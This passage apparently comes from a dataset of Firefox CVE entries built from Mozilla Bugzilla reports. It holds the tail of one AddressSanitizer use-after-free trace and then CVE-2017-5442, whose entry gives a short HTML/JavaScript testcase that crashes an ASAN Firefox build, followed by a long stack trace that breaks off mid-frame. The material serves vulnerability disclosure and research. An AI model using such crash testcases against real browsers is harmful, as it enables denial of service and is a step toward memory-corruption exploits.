mozilla::GeckoRestyleManager::ProcessPendingRestyles() /home/worker/workspace/build/src/layout/base/GeckoRestyleManager.cpp:464:3 #21 0x7fafea8f4970 in ProcessPendingRestyles /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RestyleManagerInlines.h:44:3 #22 0x7fafea8f4970 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/PresShell.cpp:4137 #23 0x7fafe699deae in FlushPendingNotifications /home/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:598:5 #24 0x7fafe699deae in nsDocument::FlushPendingNotifications(mozilla::FlushType) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:7984 #25 0x7fafe69e64be in nsFocusManager::CheckIfFocusable(nsIContent*, unsigned int) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1550:3 #26 0x7fafe69e2b5c in nsFocusManager::SetFocusInner(nsIContent*, int, bool, bool) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1180:41 #27 0x7fafe69e5efe in nsFocusManager::SetFocus(nsIDOMElement*, unsigned int) /home/worker/workspace/build/src/dom/base/nsFocusManager.cpp:484:3 #28 0x7fafe8a33008 in mozilla::dom::HTMLInputElement::Select() /home/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:3721:7 #29 0x7fafe811cd60 in mozilla::dom::HTMLInputElementBinding::select(JSContext*, JS::Handle<JSObject*>, mozilla::dom::HTMLInputElement*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLInputElementBinding.cpp:2856:3 #30 0x7fafe8325787 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2953:13 #31 0x7fafede2343f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #32 0x7fafede2343f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #33 0x7fafede23e32 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #34 0x7fafeea96dfc in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #35 0x7fafeea4d04e in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:14 #36 0x7fafeea768b9 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:464:12 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:307:45 in operator bool Shadow bytes around the buggy address: 0x0c1a8000d970: fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c1a8000d980: fd fd fd fa fa fa fa fa fa fa fa fa fd fd fd fd 0x0c1a8000d990: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa 0x0c1a8000d9a0: fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd 0x0c1a8000d9b0: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa =>0x0c1a8000d9c0: fd fd fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd 0x0c1a8000d9d0: fd fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd 0x0c1a8000d9e0: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa 0x0c1a8000d9f0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 0x0c1a8000da00: 00 00 00 00 00 fa fa fa fa fa fa fa fa fa 00 00 0x0c1a8000da10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==18823==ABORTING"
      }
    ],
    "CVE-2017-5442": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1347979",
        "title": "heap-use-after-free in GetRequiredInnerTextLineBreakCount",
        "description": "The following testcase crashes the latest ASAN build of Firefox (BuildID=20170316115330) <script> function start() { o0=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); o0.src=\"data:text/html,<div><div><div>\"; o0.addEventListener('load', fun0,false); document.body.appendChild(o0); o2=window.document.documentElement; } function fun0() { o4=o0.contentDocument; tmp=o4.getElementsByTagName('*'); o5=tmp[0]; o7=tmp[4]; o0.contentWindow.onresize=fun1; o0.width='-4px'; o7.innerHTML='<rp><style>*{ display: ruby-text-container;</style> a'; o5.innerText; } function fun1() { o2.textContent='undefined'; } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==7691==ERROR: AddressSanitizer: heap-use-after-free on address 0x6250003cb680 at pc 0x7f3175181423 bp 0x7ffeb6ea8e30 sp 0x7ffeb6ea8e28 READ of size 8 at 0x6250003cb680 thread T0 (Web Content) #0 0x7f3175181422 in GetContent /home/worker/workspace/build/src/obj-firefox/dist/include/nsIFrame.h:676:43 #1 0x7f3175181422 in GetRequiredInnerTextLineBreakCount /home/worker/workspace/build/src/dom/base/nsRange.cpp:3487 #2 0x7f3175181422 in nsRange::GetInnerTextNoFlush(mozilla::dom::DOMString&, mozilla::ErrorResult&, nsIContent*, unsigned int, nsIContent*, unsigned int) /home/worker/workspace/build/src/dom/base/nsRange.cpp:3588 #3 0x7f317709e5eb in nsGenericHTMLElement::GetInnerText(mozilla::dom::DOMString&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/html/nsGenericHTMLElement.cpp:2984:3 #4 0x7f31765e67fb in mozilla::dom::HTMLElementBinding::get_innerText(JSContext*, JS::Handle<JSObject*>, nsGenericHTMLElement*, JSJitGetterCallArgs) /home/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLElementBinding.cpp:250:9 #5 0x7f31768d089c in mozilla::dom::GenericBindingGetter(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2843:13 #6 0x7f317c05c361 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #7 0x7f317c05c361 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #8 0x7f317c05d97f in InternalCall /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:493:12 #9 0x7f317c05d97f in Call /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512 #10 0x7f317c05d97f in js::CallGetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:627 #11 0x7f317cedc605 in CallGetter /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:1832:16 #12 0x7f317cedc605 in GetExistingProperty<js::AllowGC::CanGC> /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:1880 #13 0x7f317cedc605 in NativeGetPropertyInline<js::AllowGC::CanGC> /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2111 #14 0x7f317cedc605 in js::NativeGetProperty(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2145 #15 0x7f317cc5bd4d in GetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1442:12 #16 0x7f317cc5bd4d in js::Wrapper::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:143 #17 0x7f317cc10865 in js::CrossCompartmentWrapper::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:226:23 #18 0x7f317cc39510 in js::Proxy::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:325:21 #19 0x7f317c064c0b in GetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1441:16 #20 0x7f317c064c0b in GetProperty /home/worker/workspace/build/src/js/src/jsobj.h:845 #21 0x7f317c064c0b in js::GetProperty(JSContext*, JS::Handle<JS::Value>, JS::Handle<js::PropertyName*>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:4307 #22 0x7f317c048281 in GetPropertyOperation /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:192:12 #23 0x7f317c048281 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2671 #24 0x7f317c02b5ce in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #25 0x7f317c05c4e6 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #26 0x7f317c05ccf2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #27 0x7f317c9cfecb in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2887:12 #28 0x7f317637a017 in mozilla::dom::EventListener::HandleEvent(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventListenerBinding.cpp:47:8 #29 0x7f3176ca5c88 in HandleEvent<mozilla::dom::EventTarget *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventListenerBinding.h:65:12 #30 0x7f3176ca5c88 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1120 #31 0x7f3176ca7aaa in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1297:20 #32 0x7f3176c930e1 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:465:16 #33 0x7f3176c96632 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 #34 0x7f3174ced50d in nsGlobalWindow::PostHandleEvent(mozilla::EventChainPostVisitor&) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:3815:7 #35 0x7f3176c931d7 in PostHandleEvent /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:416:12 #36 0x7f3176c931d7 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:468 #37 0x7f3176c9375c in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:518:5 #38 0x7f3176c96632 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 #39 0x7f3178dc91ec in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1043:7 #40 0x7f317b1502d9 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7671:21 #41 0x7f317b14c538 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7465:7 #42 0x7f317b15368f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7362:13 #43 0x7f3174063729 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1258:3 #44 0x7f31740626dc in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:842:14 #45 0x7f317405f578 in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:732:9 #46 0x7f31740613f2 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:614:5 #47 0x7f317406211c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:470:14 #48 0x7f3172832352 in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:634:28 #49 0x7f3175038b6b in nsDocument::DoUnblockOnload() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8858:18 #50 0x7f317503873c in nsDocument::UnblockOnload(bool) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8784:9 #51 0x7f317500f6ed in nsDocument::DispatchContentLoadedEvents() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:5289:3 #52 0x7f31750d8ce2 in applyImpl<nsDocument, void (nsDocument::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:855:12 #53 0x7f31750d8ce2 in apply<nsDocument, void (nsDocument::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:861 #54 0x7f31750d8ce2 in mozilla::detail::RunnableMethodImpl<nsDocument*, void (nsDocument::*)(), true, false>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:890 #55 0x7f317264ba61 in mozilla::ValidatingDispatcher::Runnable::Run() /home/worker/workspace/build/src/xpcom/threads/Dispatcher.cpp:259:32 #56 0x7f317267f34c in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1269:14 #57 0x7f317267bc78 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #58 0x7f3173423de1 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #59 0x7f3173384940 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #60 0x7f3173384940 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #61 0x7f3173384940 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #62 0x7f31785e89af in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27 #63 0x7f317bc11f07 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:854:22 #64 0x7f3173384940 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:10 #65 0x7f3173384940 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #66 0x7f3173384940 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #67 0x7f317bc11926 in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:686:34 #68 0x4eb4b3 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 #69 0x4eb4b3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:286 #70 0x7f318da7b82f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291 #71 0x41ce08 in _start (/home/nils/fuzzer3/firefox/firefox+0x41ce08) 0x6250003cb680 is located 5504 bytes inside of 8192-byte region [0x6250003ca100,0x6250003cc100) freed by thread T0 (Web Content) here: #0 0x4bb33b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:47:3 #1 0x7f318ad52347 in FreeArenaList /home/worker/workspace/build/src/nsprpub/lib/ds/plarena.c:195:9 #2 0x7f318ad52347 in PL_FinishArenaPool /home/worker/workspace/build/src/nsprpub/lib/ds/plarena.c:222 #3 0x7f3178c5f00c in nsPresArena::~nsPresArena() /home/worker/workspace/build/src/layout/base/nsPresArena.cpp:56:3 #4 0x7f3178cd689b in nsIPresShell::~nsIPresShell() /home/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:182:7 #5 0x7f3178cd6a3d in mozilla::PresShell::~PresShell() /home/worker/workspace/build/src/layout/base/PresShell.cpp:899:1 #6 0x7f3178cd2314 in mozilla::PresShell::Release() /home/worker/workspace/build/src/layout/base/PresShell.cpp:893:1 #7 0x7f3178adb884 in ~nsCOMPtr_base /home/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:294:7 #8 0x7f3178adb884 in nsComputedDOMStyle::GetStyleContextForElement(mozilla::dom::Element*, nsIAtom*, nsIPresShell*, nsComputedDOMStyle::StyleType) /home/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:451 #9 0x7f317517fe0f in ElementIsVisible /home/worker/workspace/build/src/dom/base/nsRange.cpp:3454:31 #10 0x7f317517fe0f in nsRange::GetInnerTextNoFlush(mozilla::dom::DOMString&, mozilla::ErrorResult&, nsIContent*, unsigned int, nsIContent*, unsigned int) /home/worker/workspace/build/src/dom/base/nsRange.cpp:3583 #11 0x7f317709e5eb in nsGenericHTMLElement::GetInnerText(mozilla::dom::DOMString&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/html/nsGenericHTMLElement.cpp:2984:3 #12 0x7f31765e67fb in mozilla::dom::HTMLElementBinding::get_innerText(JSContext*, JS::Handle<JSObject*>, nsGenericHTMLElement*, JSJitGetterCallArgs) /home/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLElementBinding.cpp:250:9 #13 0x7f31768d089c in mozilla::dom::GenericBindingGetter(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2843:13 #14 0x7f317c05c361 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #15 0x7f317c05c361 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #16 0x7f317c05d97f in InternalCall /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:493:12 #17 0x7f317c05d97f in Call /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512 #18 0x7f317c05d97f in js::CallGetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:627 #19 0x7f317cedc605 in CallGetter /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:1832:16 #20 0x7f317cedc605 in GetExistingProperty<js::AllowGC::CanGC> /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:1880 #21 0x7f317cedc605 in NativeGetPropertyInline<js::AllowGC::CanGC> /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2111 #22 0x7f317cedc605 in js::NativeGetProperty(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2145 #23 0x7f317cc5bd4d in GetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1442:12 #24 0x7f317cc5bd4d in js::Wrapper::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:143 #25 0x7f317cc10865 in js::CrossCompartmentWrapper::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:226:23 #26 0x7f317cc39510 in js::Proxy::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:325:21 #27 0x7f317c064c0b in GetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1441:16 #28 0x7f317c064c0b in GetProperty /home/worker/workspace/build/src/js/src/jsobj.h:845 #29 0x7f317c064c0b in js::GetProperty(JSContext*, JS::Handle<JS::Value>, JS::Handle<js::PropertyName*>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:4307 #30 0x7f317c048281 in GetPropertyOperation /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:192:12 #31 0x7f317c048281 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2671 #32 0x7f317c02b5ce in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #33 0x7f317c05c4e6 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #34 0x7f317c05ccf2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #35 0x7f317c9cfecb in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2887:12 #36 0x7f317637a017 in mozilla::dom::EventListener::HandleEvent(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventListenerBinding.cpp:47:8 #37 0x7f3176ca5c88 in HandleEvent<mozilla::dom::EventTarget *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventListenerBinding.h:65:12 #38 0x7f3176ca5c88 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1120 #39 0x7f3176ca7aaa in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1297:20 #40 0x7f3176c930e1 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:465:16 #41 0x7f3176c96632 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:822:9 #42 0x7f3174ced50d in nsGlobalWindow::PostHandleEvent(mozilla::EventChainPostVisitor&) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:3815:7 #43 0x7f3176c931d7 in PostHandleEvent /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:416:12 #44 0x7f3176c931d7 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:468 previously allocated by thread T0 (Web Content) here: #0 0x4bb68c in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:64:3 #1 0x7f318ad51c54 in PL_ArenaAllocate /home/worker/workspace/build/src/nsprpub/lib/ds/plarena.c:127:27 #2 0x7f3178c5f84b in nsPresArena::Allocate(unsigned int, unsigned long) /home/worker/workspace/build/src/layout/base/nsPresArena.cpp:165:3 #3 0x7f3178bda31f in AllocateByObjectID /home/worker/workspace/build/src/layout/base/nsPresArena.h:65:12 #4 0x7f3178bda31f in AllocateByObjectID /home/worker/workspace/build/src/layout/base/nsIPresShell.h:240 #5 0x7f3178bda31f in operator new /home/worker/workspace/build/src/layout/style/nsStyleContext.cpp:1400 #6 0x7f3178bda31f in NS_NewStyleContext(nsStyleContext*, nsIAtom*, mozilla::CSSPseudoElementType, nsRuleNode*, bool) /home/worker/workspace/build/src/layout/style/nsStyleContext.cpp:1429 #7 0x7f3178be9ee4 in nsStyleSet::GetContext(nsStyleContext*, nsRuleNode*, nsRuleNode*, nsIAtom*, mozilla::CSSPseudoElementType, mozilla::dom::Element*, unsigned int) /home/worker/workspace/build/src/layout/style/nsStyleSet.cpp:946:14 #8 0x7f3178beeb01 in nsStyleSet::ResolveStyleForInternal(mozilla::dom::Element*, nsStyleContext*, TreeMatchContext&, nsStyleSet::AnimationFlag) /home/worker/workspace/build/src/layout/style/nsStyleSet.cpp:1400:10 #9 0x7f3178bee5a0 in nsStyleSet::ResolveStyleFor(mozilla::dom::Element*, nsStyleContext*, TreeMatchContext&) /home/worker/workspace/build/src/layout/style/nsStyleSet.cpp:1410:10 #10 0x7f3178d83598 in ResolveStyleFor /home/worker/workspace/build/src/layout/style/nsStyleSet.h:136:12 #11 0x7f3178d83598 in ResolveStyleFor /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/StyleSetHandleInlines.h:94 #12 0x7f3178d83598 in nsCSSFrameConstructor::ResolveStyleContext(nsStyleContext*, nsIContent*, nsFrameConstructorState*, mozilla::dom::Element*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:5066 #13 0x7f3178d868b2 in ResolveStyleContext /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:5031:10 #14 0x7f3178d868b2 in ResolveStyleContext /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:5047 #15 0x7f3178d868b2 in nsCSSFrameConstructor::AddFrameConstructionItems(nsFrameConstructorState&, nsIContent*, bool, nsCSSFrameConstructor::InsertionPoint const&, nsCSSFrameConstructor::FrameConstructionItemList&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:5685 #16 0x7f3178d69fd1 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:11046:9 #17 0x7f3178d7e759 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4079:9 #18 0x7f3178d8922f in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6220:3 #19 0x7f3178d7ea46 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10760:5 #20 0x7f3178d7ea46 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, 